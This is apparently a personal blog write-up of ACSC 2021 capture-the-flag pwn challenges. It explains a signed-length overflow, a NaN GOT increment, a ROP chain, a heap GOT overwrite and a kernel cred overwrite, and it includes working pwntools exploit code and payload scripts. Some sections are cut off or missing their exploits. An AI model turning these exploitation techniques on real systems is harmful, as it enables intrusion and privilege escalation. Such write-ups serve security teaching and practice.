summary: Writeups for filtered, histogram, CArot, bvar and sysnote pwn challenges from ACSC 2021.

I played ACSC this year. I only tried pwn challenges and was able to solve all pwn except Message Center. The challenges were pretty awesome and had new things to learn. I really enjoyed it. Here are writeups for the ones I solved.

# Filtered - 100 pts - 168 solves
The relevant parts of challenge source are below:
```c
/* Call this function! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  exit(0);
}
void readline(const char *msg, char *buf, size_t size) {
[redacted]

/* Print `msg` and read an integer value */
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}

/* Entry point! */
int main() {
  int length;
  char buf[0x100];

  /* Read and check length */
  length = readint("Size: ");
  if (length > 0x100) {
    print("Buffer overflow detected!\n");
    exit(1);
  }

  /* Read data */
  readline("Data: ", buf, length);
  print("Bye!\n");

  return 0;
}
```
Looking at the source reveals that there is a `win` function to get the flag. So we just need to somehow call this function.
In `main`, the program reads an `int` (length) then checks if it is greater than `0x100`, if it is then exits; otherwise reads that many bytes in `buf` buffer of size `0x100`.<br>
The issue here is that whenever bounds checks are to be done, `unsigned` variables must be used. But, the program uses `signed` variables for the bounds check. This becomes a security issue because giving a negative number passes the check and the `readline` function interprets the length as an `unsigned` value. Hence, reads a large number of bytes are read into the `buf` buffer.<br>
Let's take a look at the protections on the binary.
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
No canary and PIE is disabled. So, we can do a simple `ret2win` by giving a negative number. I chose `-1` for maximum bytes.<br>
Just calculate the offset upto RIP and put address of `win` and you get the flag.
```py
#!/usr/bin/env python3
from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote('filtered.chal.acsc.asia', 9001)
    else:
        p = elf.process()

context.binary = elf = ELF('./filtered')
libc = elf.libc
start()

p.sendlineafter(': ', '-1')
p.sendlineafter(': ', b'A'*280 + p64(elf.sym.win))

p.interactive()
p.close()
```

# Histogram - 200 pts - 38 solves
Relevant source code below:
```c
[redacted]
int map[WSIZE][HSIZE] = {0};
int wsum[WSIZE] = {0};
int hsum[HSIZE] = {0};

/* Call this function to get the flag! */
void win(void) {
  char flag[0x100];
  FILE *fp = fopen("flag.txt", "r");
  int n = fread(flag, 1, sizeof(flag), fp);
  printf("%s", flag);
  exit(0);
}

int read_data(FILE *fp) {
  /* Read data */
  double weight, height;
  int n = fscanf(fp, "%lf,%lf", &weight, &height);
  if (n == -1)
    return 1; /* End of data */
  else if (n != 2)
    fatal("Invalid input");

  /* Validate input */
  if (weight < 1.0 || weight >= WEIGHT_MAX)
    fatal("Invalid weight");
  if (height < 1.0 || height >= HEIGHT_MAX)
    fatal("Invalid height");

  /* Store to map */
  short i, j;
  i = (short)ceil(weight / WEIGHT_STRIDE) - 1; // WEIGHT_STRIDE = 10
  j = (short)ceil(height / HEIGHT_STRIDE) - 1; // HEIGHT_STRIDE = 10
  
  map[i][j]++;
  wsum[i]++;
  hsum[j]++;

  return 0;
}
[redacted]

int main(int argc, char **argv) {
  if (argc < 2)
    fatal("No input file");

  /* Open CSV */
  FILE *fp = fopen(argv[1], "r");
  if (fp == NULL)
    fatal("Cannot open the file");

  /* Read data from the file */
  int n = 0;
  while (read_data(fp) == 0)
    if (++n > SHRT_MAX)
      fatal("Too many input");
[redacted]
}
```
This program also has a `win` function. We just need a way to execute it.<br>
The program basically reads the Comma-separated-values (CSV) file given as first argument, reads the values, perform some checks and increments the relevant point in the map for the `weight,height` values for making a histogram. `weight` and `height` are read as floats. The program does not have a vulnerability.<br>
The issue actually appears due to a special feature. The floats are defined by [IEEE-754](https://en.wikipedia.org/wiki/IEEE_754) standard. This standard defines some special values. Namely: `NaN` (Not-a-Number), `inf`, `-inf` (infinities) and `-0`.<br>
We can try using these special values to see how the program behaves.<br>
Using `-0` works same as `0` and fails the check. Trying `inf` and `-inf` doesn't pass the checks either.<br>
But, `NaN` is special. The standard defines interesting properties for it. The most interesting are the comparisons. Whenever `NaN` is compared to a number-like variable, the comparison evaluates to `False`. Even `NaN == NaN` is not true.<br>
So, using `NaN,1` passes the check. Its value is actually `0x80000000`. After all the arithmetic, it becomes `0x7fffffff` and lands us at `0x404028` which is GOT for `fread`. Increasing `height` by multilples of ten lets us move across the GOT and, hence, increment any GOT value.<br> 
I decided to increment GOT of `fclose` because it is executed at end and has no occurences before that. So, the GOT will have a binary address. `NaN,30` lands us at GOT of `fclose`. I need to increment it `0x401268 - 0x401060 = 0x208` times. I created `exploit.csv` using the following one-liner.
```py
open('exploit.csv', 'w+').write('NaN,30\n'*0x208)
```
The website had some issues so I used the following python script to send the file.
```py
import requests

req = requests.post('https://histogram.chal.acsc.asia/api/histogram', files = {"csv" : open("exploit.csv", "rb")}, verify = False)
print(req.text)
```

  char* ret = strdup(buffer+4);

  while (1) {
    buffer[0] = '\0';
    scanf("%[^\n]", buffer);
    getchar();
    
    int n = strlen(buffer);
    if (n == 0) break;

  setbuf(stdout, NULL);
  while (1) {
    char* fname = http_receive_request();
    if (fname == NULL) {
      http_send_reply_bad_request();
    } else {
      try_http_send_reply_with_file(fname);
      free(fname); 
    }

    if (connect_mode != KEEP_ALIVE) break;
  }
}
```
Analyzing the source reveals that this is something like a webserver. The upcoming request should be a `GET` request and must have either `HTTP/1.0` or `HTTP/1.1` at end. The path is stored in `buffer` of size `512` bytes. But, bytes are read using `scanf("%[^\n]", buffer);`. This `scanf` is bounds-unaware and reads bytes until it receives a null byte. This effectively imitates the notorious `gets` function except that it leaves the newline in the stream. Hence, a buffer overflow vulnerability. Then it reads some other headers, but this can be skipped using a simple newline.<br>
This program does not have a `win` function, so we need some other primitive to read the flag.<br>
One thing to note about this challenge is that we don't have direct interaction with the binary. Following script works as a proxy between us and the binary.
```py
#!/usr/bin/python3

from time import sleep
from sys import stdin, stdout, exit
from socket import *

LIMIT = 4096

buf = b''
while True:
  s = stdin.buffer.readline()
  buf += s

  if len(buf) > LIMIT:
    print('You are too greedy')
    exit(0)

  if s == b'\n':
    break

p = socket(AF_INET, SOCK_STREAM)
p.connect(("localhost", 11452))
p.sendall(buf)

sleep(2)

p.setblocking(False)
res = b''
try:
  while True:
    s = p.recv(1024)
    if not s:
      break
    res += s
except:
  pass

stdout.buffer.write(res)
```

No PIE and NX hint at a ROP challenge, GOT is not writeable and there's no canary.<br>
Now it's pretty clear that it's a ROP challenge. But, because we don't have direct interaction with the binary we can't do a simple `ret2libc` attack. We need to build something like that using the existing gadgets.<br>
Following are the gadgets I used:
```py
pop_rbp                = 0x400828
pop_rdi                = 0x4010d3
pop_rbx_pop_rbp_pop_4  = 0x4010ca
pop_rsi_pop_r15        = 0x4010d1

ret                    = pop_rdi + 1

mov_rax_qword_rbp_8    = 0x400b7d
mov_qword_rbp_0x30_rax = 0x400cae

add_dword_rbp_0x3d_ebx = 0x400888

jmp_qword_rbp          = 0x4014fb
```
The whole idea behind my ROP chain is to read address of `printf` to a writeable area, increment it to make it `system` address, read a string for argument of `system` then call system with the string.<br>
pseudo-code below:
```
rax = qword ptr [printf's GOT]

rbx = system - printf
rbp = &gif - 8

[rbp] = rax             // write printf address
[&gif - 8] += rbx       // increment

scanf("%[^\n]", &gif)   // read the command

rdi = &gif
rbp = &gif - 8

jmp [rbp]              // system(&gif)
```
My exploit:

```
This program stores pairs of `name` and `data` using custom heap-like functionality. The `name` can be of 4 bytes and data can be of 8 bytes at maximum. The pairs are stored in a doubly-linked list using `node` and `node_data` structs. It lets us `add`, `delete`, `clear` the head, `edit` and `print` node and its data.`name` and `data` need to be separated by `=`.<br>
Analyzing the program reveals two issues:<br>
1. The freelist is same for all sizes. (_size is just a number_)
2. When we delete the `head` node, `head` pointer is not cleared.<br>

So, when we free the `head` node and add a new node, because of LIFO, the `node_data` of head becomes `node` and `node` becomes `node_data` of the new node. `name` of new node is written in the `next` area of `head` and since name is read using `read`, no null-byte termination.<br>
This lets us control which values will be checked for further operations when the list is traversed.<br>
Lets check protections enabled:
```
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```
PIE is enabled and RELRO is disabled. So, we will most likely do a GOT overwrite, but for that we need a binary leak.<br>
Since, the heap-like implementation is in bss, so, leaking a pointer from one of the structures will give us a binary leak.<br>
For leak, I overwrote the `next` pointer's lsb to `0xc8`, which points to `data` of new node. Since, new node's `next` is null, sending an empty string will match with it and return the `data` pointer using the printing mechanism.
```
0x55e6239f5508: 0x000055e6239f5594     <---- head

gef➤  x/2gx 0x000055e6239f5594

                                                            head node and data and 
                                                            name of new node
gef➤  x/2gx 0x000055e6239f55c8

                                                            of head and data and
                                                            next of new node
```
This gives `0x000055e6239f5584`.<br>
But, for properly using the GOT overwrite, we need a libc leak also.<br>
I cleared the `head` and repeated the same mechanism for libc leak using `exit`'s GOT because it was last in the list of GOT but with `0x08` for the overwrite. This way I get `exit`'s address and calculate libc base using it.<br>
Finally, time for the overwrite. I decided to do overwrite `strlen`'s GOT because it was the first function our input was fed into and has a signature like system.<br>
Once again, cleared the `head`, created two nodes; second one with address of `GOT of strlen - 8` because the edit function lets us edit 4 bytes of `name` only. That's enough because the upper 4 bytes are same for all libc addresses, Freed the `head`, created a new node, overwrote lsb with `0x60` which points to the the location of `GOT of strlen - 8`, send `edit` with lower 4 bytes of `strlen` then edit `strlen` to `system`. Then simply sending `/bin/sh` gives shell.

```
There was one small issue with this approach. `strlen` is a function having different implementations (ifunc) in libc which are used based upon the system libc is running on. For some reason, different implementations were used on my machine and the remote server.<br>
To get the specific implemention, I leaked the `strlen`'s address on remote using the same leaking mechanism because after `strlen` there's is `__stack_chk_fail`'s GOT which is same on my machine and remote server. Then simple offset calculation.<br>

# sysnote - 400 pts - 5 solves
This is a kernel pwn challenge. Some syscalls are added into kernel. This was special for me because I recently learned some kernel pwning techniques and this was my first time solving a kernel challenges during a CTF. I will skip some beginner stuff here, for that checkout my [writeup]({% post_url 2021-09-10-pass - grabcon %}) for a kernel challenge.<br>
Code for the syscalls is below:
```c
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/compiler.h>
#include <linux/export.h>
#include <linux/fault-inject-usercopy.h>

#include <linux/thread_info.h>
#include <linux/uaccess.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/mm.h>

/* Looks like there is no strcpy_from_user function in kernel... so i made it! */
long strcpy_from_user(char *dst, const char __user *src)
{
    unsigned long max_addr, src_addr;
    long res = 0;

    might_fault();
	if (should_fail_usercopy())
		return -EFAULT;
	max_addr = user_addr_max();
	src_addr = (unsigned long)untagged_addr(src);
    if (likely(src_addr < max_addr)) {
        unsigned long max = max_addr - src_addr;
        if (user_read_access_begin(src, max)) {
            while (max) {
                char c;

                unsafe_get_user(c,src+res, efault);
                
                if (!c)
                    return res;
                dst[res] = c;
                res++;
                max--;
            }
            user_read_access_end();
            return res;
        }
    }
efault:
	return -EFAULT;
}

SYSCALL_DEFINE0(current_addr)
{
    return (long)current;
}

SYSCALL_DEFINE1(add_note, const char __user *, str)
{
    return strcpy_from_user(current->note, str);
}

SYSCALL_DEFINE0(delete_note)
{
    memset(current->note, 0, sizeof(current->note));
    return 0;
}

SYSCALL_DEFINE1(show_note, const char __user *, str)
{
    return copy_to_user((void *)str, current->note, strlen(current->note));
}

SYSCALL_DEFINE1(copy_note, const char __user *, str)
{
    return copy_from_user(current->note, (void *)str, sizeof(current->note));
}
```
Looking at the code reveals that these syscalls deal with current `task_struct` and its member `note`. `note` is not a member of `task_struct` in the actual kernel, it was added in `k.patch` file just before the `cred struct`s of the current process.

We also get the syscall numbers for the new syscalls. Following is an overview of each syscall:
- `add_note`: copies a user provided buffer into the note using a dangerous `strcpy_from_user` function (buffer overflow; doesn't allow null bytes)
- `delete_note`: nulls the whole note
- `show_note`: copies note (until a null) to a userland buffer
- `copy_node`: copies 1024 bytes from user buffer to note (allows null bytes)
- `current_addr`: gives address of current process's `task_struct`<br>

Since the note is adjacent to the `cred struct`, the best way to become root is to overwrite `cred` with `init_cred`<br>
But for that, we need a kernel leak. Since we get `current_task` using `current_addr` syscall, I checked `task_struct` for kernel pointers and found a kernel pointer after some values from `current_cred` pointer.

```
Initially, I tried overwriting values upto this pointer, copying note, calculate kernel base, overwrite `cred` with `init_cred` and spawn a shell. But, becuase null bytes are not allowed in `strcpy_from_user` and leaving random values makes the kernel panic.<br>
I was stuck here for a long time then I decided to overwrite `cred` to `address of the kernel pointer - 4` and use `getuid` to read its lower 4 bytes and `getgid` for upper 4 bytes. `-4` because in `cred struct` the first `int` is a magic number and `uid` is stored after the magic number. Reading the lower 4 bytes worked fine but trying to read upper 4 bytes always gave `0xfffe` instead of `0xffffffff`; because the upper 4 bytes were always `0xffffffff` and it correspond to `-1`, so, it thought it was an error. So, I just hardcoded `0xffffffff` because it was same everytime.<br>
After getting the pointer, I replaced `real_cred` and `cred` with `init_cred` and spawned a shell.<br>
You just have to be careful about not printing anything before repairing `cred` because `write` syscall does some checks which are done using `selinux_file_permission` which are based on `cred`, having an invalid pointer will make the kernel panic.<br>
